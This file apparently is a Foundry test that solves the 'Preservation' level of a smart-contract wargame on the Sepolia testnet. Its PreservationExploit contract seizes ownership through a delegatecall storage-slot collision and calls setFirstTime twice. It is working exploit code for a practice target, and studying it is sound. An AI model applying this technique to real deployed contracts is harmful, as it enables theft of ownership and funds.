// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/levels/16-Preservation/Preservation.sol";

contract ContractTest is Test {
    PreservationExploit PreservationExploitContract;
    Preservation level16 = Preservation(payable(0xb23d4B1736d7fFC212c53cCe25C88Ce0CF99dC1D));

    function setUp() public {
 
    vm.createSelectFork(vm.rpcUrl("sepolia"));

    }

    function testExploit16() public {
        PreservationExploitContract = new PreservationExploit();
        PreservationExploitContract.exploit(address(level16));

    }
    
  receive() external payable {}
}


contract PreservationExploit {
    address public _timeZone1Library;
    address public _timeZone2Library;
    address public owner; //slot 2

    function setTime(uint256 _time) public {
        owner = tx.origin;
    }

    function exploit(address instanceAddress) public {
        Preservation instance = Preservation(payable(instanceAddress));
        instance.setFirstTime(uint256(uint160(address(this))));
        instance.setFirstTime(uint256(uint160(address(this))));
    }
}